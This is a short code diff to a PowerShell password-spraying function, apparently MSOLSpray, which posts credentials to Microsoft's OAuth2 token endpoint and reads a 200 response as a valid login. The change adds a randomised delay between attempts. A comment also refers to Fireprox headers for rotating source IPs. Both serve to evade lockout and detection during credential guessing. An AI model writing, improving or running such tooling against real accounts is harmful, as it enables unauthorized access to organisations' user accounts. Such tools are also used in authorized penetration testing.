@@ -109,8 +109,10 @@ function Invoke-MSOLSpray{
         #Add Special Headers for Firprox Here. ';' is seperation char. Example: 'X-My-X-HEADER' = 'VALUE'
         $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}#;'X-My-X-Forwarded-For' = '127.0.0.1'}
         if ($Delay) {
-            Start-Sleep -Seconds $Delay
+            $SleepTime = Get-Random -Minimum 0 -Maximum $Delay
+            Start-Sleep -Seconds $SleepTime
         }
+
 		$webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -UserAgent $UserAgent -ErrorVariable RespErr 
 
        # If we get a 200 response code it's a valid cred
